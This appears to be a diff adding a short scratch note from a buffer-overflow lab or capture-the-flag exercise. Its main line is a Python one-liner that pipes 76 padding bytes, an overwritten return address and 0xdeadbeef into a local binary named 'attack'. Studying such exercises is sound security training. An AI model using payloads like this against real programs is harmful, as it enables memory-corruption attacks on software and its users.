@@ -1,0 +1,3 @@
+Var2CD
+
+3a+b				python -c 'print 76 * "A" + "\x2c\x93\x04\x08" + "\xef\xbe\xad\xde"' | ./attack 
